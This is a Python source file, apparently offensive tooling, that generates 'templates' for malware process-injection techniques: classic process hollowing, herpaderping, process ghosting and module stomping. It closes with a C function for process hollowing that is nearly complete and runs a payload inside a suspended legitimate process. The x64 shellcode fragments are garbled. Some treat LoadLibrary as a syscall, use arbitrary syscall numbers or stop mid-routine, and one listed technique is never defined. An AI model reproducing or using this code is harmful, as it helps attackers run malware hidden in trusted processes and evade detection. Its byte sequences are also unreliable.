import random
import struct
from typing import List, Tuple

class ProcessHollowingTemplate:
    def __init__(self):
        self.techniques = {
            "classic": self._classic_hollowing,
            "herpaderping": self._herpaderping,
            "process_ghosting": self._process_ghosting,
            "module_stomping": self._module_stomping,
            "atom_bombing": self._atom_bombing,
        }
    
    def generate_template(self, technique: str = "random") -> Tuple[str, bytes]:
        """Generate process hollowing template"""
        if technique == "random":
            tech_name = random.choice(list(self.techniques.keys()))
        else:
            tech_name = technique
        
        template_func = self.techniques[tech_name]
        description, shellcode = template_func()
        
        return description, shellcode
    
    def _classic_hollowing(self) -> Tuple[str, bytes]:
        """Classic process hollowing technique"""
        description = """
CLASSIC PROCESS HOLLOWING:
1. Create suspended process (svchost.exe)
2. Read its PEB to get image base
3. Unmap original executable
4. Allocate new memory at same address
5. Write payload
6. Set thread context to payload entry point
7. Resume thread
"""
        
        # x64 shellcode for classic hollowing
        shellcode = (
            # Create suspended svchost.exe
            b"\x48\x83\xEC\x28"                     # sub rsp, 0x28
            b"\x48\x31\xC9"                         # xor rcx, rcx
            b"\x48\x31\xD2"                         # xor rdx, rdx
            b"\x49\xB8" + b"svchost\x00"            # mov r8, "svchost"
            b"\x48\x31\xC0"                         # xor rax, rax
            b"\x4D\x31\xC9"                         # xor r9, r9
            b"\x49\x83\xC1\x04"                     # add r9, 4 (CREATE_SUSPENDED)
            b"\x48\xB8" + struct.pack("<Q", 0x50)   # mov rax, NtCreateProcessEx syscall
            b"\x0F\x05"                             # syscall
            
            # ... more shellcode would follow
            b"\xC3"                                 # ret
        )
        
        return description, shellcode
    
    def _herpaderping(self) -> Tuple[str, bytes]:
        """Process Herpaderping technique"""
        description = """
PROCESS HERPADERPING:
1. Create legitimate file on disk
2. Open file with write access
3. Create process from that file (now in memory)
4. Before process starts, overwrite file with malware
5. Windows caches original image, runs legit process
6. File on disk shows malware, but running process is legit
"""
        
        shellcode = (
            # Herpaderping technique shellcode
            b"\x48\x89\x5C\x24\x08"                 # mov [rsp+8], rbx
            b"\x57"                                 # push rdi
            b"\x48\x83\xEC\x30"                     # sub rsp, 0x30
            
            # Create temporary file
            b"\x48\x8D\x15" + struct.pack("<I", 0x100)  # lea rdx, [rel temp_path]
            b"\x48\x31\xC9"                         # xor rcx, rcx
            b"\x48\x89\xCA"                         # mov rdx, rcx
            b"\x48\xB8" + struct.pack("<Q", 0x35)   # NtCreateFile syscall
            b"\x0F\x05"                             # syscall
            
            # ... implementation continues
            b"\x48\x8B\x5C\x24\x40"                 # mov rbx, [rsp+0x40]
            b"\x48\x83\xC4\x30"                     # add rsp, 0x30
            b"\x5F"                                 # pop rdi
            b"\xC3"                                 # ret
        )
        
        return description, shellcode
    
    def _process_ghosting(self) -> Tuple[str, bytes]:
        """Process Ghosting technique"""
        description = """
PROCESS GHOSTING:
1. Create file with malware
2. Mark file for deletion (FILE_DELETE_ON_CLOSE)
3. Create section from the file
4. File gets deleted but section remains
5. Create process from section
6. Malware runs from 'ghost' file
"""
        
        return description, b""
    
    def _module_stomping(self) -> Tuple[str, bytes]:
        """Module Stomping / DLL Hollowing"""
        description = """
MODULE STOMPING:
1. Load legitimate DLL (like ntdll.dll)
2. Find .text section
3. Change memory protection to RWX
4. Overwrite .text section with payload
5. Create thread in DLL
6. Payload runs from trusted DLL memory
"""
        
        shellcode = (
            # LoadLibrary ntdll
            b"\x48\x31\xC0"                         # xor rax, rax
            b"\x48\x8D\x0D" + struct.pack("<I", 0x50) # lea rcx, [rel ntdll_str]
            b"\x48\xB8" + struct.pack("<Q", 0x60)   # LoadLibrary syscall
            b"\x0F\x05"                             # syscall
            
            # Find .text section
            b"\x48\x89\xC3"                         # mov rbx, rax (module handle)
            b"\x48\x8B\x43\x3C"                     # mov rax, [rbx+0x3C] (PE header)
            b"\x48\x01\xD8"                         # add rax, rbx
            
            # ... continues
            b"\xC3"
        )
        
        return description, shellcode
    
    def generate_c_template(self) -> str:
        """Generate C code template for process hollowing"""
        return """
#include <windows.h>
#include <stdio.h>

// Process Hollowing with multiple evasion techniques
BOOL ProcessHollow(LPCWSTR targetProcess, PBYTE payload, DWORD payloadSize) {
    STARTUPINFOEXW si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };
    
    // 1. Create target process suspended
    if(!CreateProcessW(targetProcess, NULL, NULL, NULL, FALSE, 
                      CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT, 
                      NULL, NULL, &si.StartupInfo, &pi)) {
        return FALSE;
    }
    
    // 2. Get PEB and image base
    PROCESS_BASIC_INFORMATION pbi;
    NtQueryInformationProcess(pi.hProcess, ProcessBasicInformation, 
                             &pbi, sizeof(pbi), NULL);
    
    PEB peb;
    ReadProcessMemory(pi.hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), NULL);
    
    // 3. Read original headers
    BYTE headers[0x1000];
    ReadProcessMemory(pi.hProcess, peb.ImageBaseAddress, headers, 0x1000, NULL);
    
    // 4. Unmap original image
    NtUnmapViewOfSection(pi.hProcess, peb.ImageBaseAddress);
    
    // 5. Allocate new memory at same address
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)payload;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(payload + dos->e_lfanew);
    
    PVOID newBase = VirtualAllocEx(pi.hProcess, peb.ImageBaseAddress,
                                  nt->OptionalHeader.SizeOfImage,
                                  MEM_COMMIT | MEM_RESERVE,
                                  PAGE_EXECUTE_READWRITE);
    
    // 6. Write headers and sections
    WriteProcessMemory(pi.hProcess, newBase, payload, 
                      nt->OptionalHeader.SizeOfHeaders, NULL);
    
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(nt);
    for(int i = 0; i < nt->FileHeader.NumberOfSections; i++, section++) {
        PVOID sectionAddr = (PBYTE)newBase + section->VirtualAddress;
        WriteProcessMemory(pi.hProcess, sectionAddr, 
                          payload + section->PointerToRawData,
                          section->SizeOfRawData, NULL);
    }
    
    // 7. Update PEB image base
    WriteProcessMemory(pi.hProcess, 
                      (PBYTE)pbi.PebBaseAddress + offsetof(PEB, ImageBaseAddress),
                      &newBase, sizeof(newBase), NULL);
    
    // 8. Set thread context and resume
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(pi.hThread, &ctx);
    
    ctx.Rax = (DWORD64)newBase + nt->OptionalHeader.AddressOfEntryPoint;
    SetThreadContext(pi.hThread, &ctx);
    
    ResumeThread(pi.hThread);
    
    return TRUE;
}
"""
